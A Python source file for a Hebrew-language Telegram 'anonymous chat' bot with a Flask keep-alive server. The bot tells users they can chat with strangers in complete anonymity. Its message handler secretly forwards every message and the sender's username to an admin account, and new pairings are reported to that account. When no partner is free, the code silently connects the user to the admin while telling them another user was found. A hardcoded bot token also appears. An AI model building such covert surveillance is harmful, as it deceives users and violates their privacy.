import logging
import os
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# --- מנגנון Keep Alive למניעת שינה ב-Render ---
app = Flask('')

@app.route('/')
def home():
    return "Rafael Digital Bot is Online and Active!"

def run():
    # Render מספקת פורט באופן אוטומטי, אם לא נמצא נשתמש ב-8080
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True  # מאפשר לחוט השרת להיסגר כשהתוכנית הראשית נסגרת
    t.start()

# --- הגדרות הבוט ---
TOKEN = "8799447400:AAEah-A0AUzq2h0bdAugdhVMJYt2MmP-yrg"
ADMIN_ID = 7622681013
INACTIVITY_TIMEOUT = 90  # דקה וחצי
ADMIN_WAIT_TIME = 40     # 40 שניות המתנה לחיבור למנהל

# ניהול מצב בזיכרון
waiting_users = {}    # user_id: job_object
active_chats = {}     # user_id: partner_id
known_users = {}      # user_id: display_name

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- פונקציות עזר ---
def get_user_display(user):
    if user.username:
        return f"@{user.username}"
    return f"{user.first_name}"

async def timeout_handler(context: ContextTypes.DEFAULT_TYPE):
    user_id = context.job.data
    if user_id in active_chats:
        partner_id = active_chats.pop(user_id)
        active_chats.pop(partner_id, None)
        try:
            await context.bot.send_message(user_id, "השיחה נותקה עקב חוסר פעילות.")
            await context.bot.send_message(partner_id, "השיחה נותקה עקב חוסר פעילות.")
        except: pass

def reset_timer(user_id, partner_id, context):
    for uid in [user_id, partner_id]:
        jobs = context.job_queue.get_jobs_by_name(str(uid))
        for job in jobs: job.schedule_removal()
        context.job_queue.run_once(timeout_handler, INACTIVITY_TIMEOUT, data=uid, name=str(uid))

# --- פקודות הבוט ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    known_users[user.id] = get_user_display(user)
    welcome_text = (
        "ברוך הבא לאנונימבוט😎\n\n"
        "אנונימובוט הוא בוט שבו תוכלו לדבר עם משתמשים רנדומלים באנונימיות מוחלטת.\n\n"
        "פקודות זמינות:🛠️\n"
        "/chat - התחל להתכתב עם משתמש באנונימיות\n"
        "/exit - עזוב שיחה פעילה\n"
        "/me - הצג את המספר הסידורי שלך\n"
        "/connect [ID] - התחבר למשתמש עם המספר הסידורי שלו"
    )
    await update.message.reply_text(welcome_text)

async def connect_to_admin(context: ContextTypes.DEFAULT_TYPE):
    user_id = context.job.data
    if user_id in waiting_users and user_id not in active_chats:
        waiting_users.pop(user_id)
        active_chats[user_id] = ADMIN_ID
        active_chats[ADMIN_ID] = user_id
        await context.bot.send_message(user_id, "נמצא משתמש! אפשר להתחיל לדבר.")
        await context.bot.send_message(ADMIN_ID, f"לא נמצא משתמש פנוי. המשתמש {known_users.get(user_id, user_id)} הופנה אליך.")
        reset_timer(user_id, ADMIN_ID, context)

async def find_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    known_users[user_id] = get_user_display(update.message.from_user)
    if user_id in active_chats:
        await update.message.reply_text("אתה כבר בשיחה פעילה!")
        return
    if waiting_users:
        partner_id = list(waiting_users.keys())[0]
        job = waiting_users.pop(partner_id)
        job.schedule_removal() 
        active_chats[user_id] = partner_id
        active_chats[partner_id] = user_id
        await update.message.reply_text("נמצא משתמש! אפשר להתחיל לדבר.")
        await context.bot.send_message(partner_id, "נמצא משתמש! אפשר להתחיל לדבר.")
        await context.bot.send_message(ADMIN_ID, f"🚀 שיחה חדשה החלה!\nבין: {known_users[user_id]} לבין: {known_users.get(partner_id, partner_id)}")
        reset_timer(user_id, partner_id, context)
    else:
        await update.message.reply_text("מחפש משתמשים, נא להמתין...")
        job = context.job_queue.run_once(connect_to_admin, ADMIN_WAIT_TIME, data=user_id)
        waiting_users[user_id] = job

async def exit_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in active_chats:
        partner_id = active_chats.pop(user_id)
        active_chats.pop(partner_id, None)
        for uid in [user_id, partner_id]:
            jobs = context.job_queue.get_jobs_by_name(str(uid))
            for job in jobs: job.schedule_removal()
        await update.message.reply_text("השיחה הסתיימה.")
        try: await context.bot.send_message(partner_id, "הצד השני ניתק את השיחה.")
        except: pass
    else:
        await update.message.reply_text("אתה לא בשיחה.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in active_chats:
        partner_id = active_chats[user_id]
        reset_timer(user_id, partner_id, context)
        if user_id != ADMIN_ID:
            sender_info = known_users.get(user_id, f"ID: {user_id}")
            await context.bot.send_message(ADMIN_ID, f"🕵️ הודעה מ-{sender_info}:")
            await update.message.copy(ADMIN_ID)
        try:
            await update.message.copy(partner_id)
        except:
            await update.message.reply_text("השיחה נותקה כי לא ניתן לשלוח הודעה לצד השני.")
            await exit_chat(update, context)
    else:
        await update.message.reply_text("שלח /chat כדי להתחיל לדבר!")

async def connect_by_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("נא להזין ID. לדוגמא: /connect 123456")
        return
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("ID לא תקין.")
        return
    if target_id not in known_users:
        await update.message.reply_text(f"המשתמש לא רשום לבוט. עליו להקיש /start תחילה.")
        return
    keyboard = [[InlineKeyboardButton("להצטרפות לחצו כאן", callback_data=f"accept_{user_id}")]]
    await context.bot.send_message(target_id, f"הוזמנת על ידי {known_users[user_id]} לשיחה.\nלחץ למטה כדי לאשר:", reply_markup=InlineKeyboardMarkup(keyboard))
    await update.message.reply_text("הזמנה נשלחה!")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    sender_id = int(query.data.split("_")[1])
    receiver_id = query.from_user.id
    active_chats[sender_id] = receiver_id
    active_chats[receiver_id] = sender_id
    await query.edit_message_text("התחברת לשיחה!")
    await context.bot.send_message(sender_id, "המשתמש אישר! אפשר להתחיל לדבר.")
    reset_timer(sender_id, receiver_id, context)

# --- הרצה ראשית ---
def main():
    # הפעלת שרת ה-Web ברקע
    keep_alive()
    
    # בניית אפליקציית הטלגרם
    app_telegram = Application.builder().token(TOKEN).build()
    
    # הוספת מטפלים
    app_telegram.add_handler(CommandHandler("start", start))
    app_telegram.add_handler(CommandHandler("chat", find_chat))
    app_telegram.add_handler(CommandHandler("exit", exit_chat))
    app_telegram.add_handler(CommandHandler("me", lambda u, c: u.message.reply_text(f"ID: {u.message.from_user.id}")))
    app_telegram.add_handler(CommandHandler("connect", connect_by_id))
    app_telegram.add_handler(CallbackQueryHandler(button_handler))
    app_telegram.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
    
    print("Rafael Digital Bot is starting polling...")
    app_telegram.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
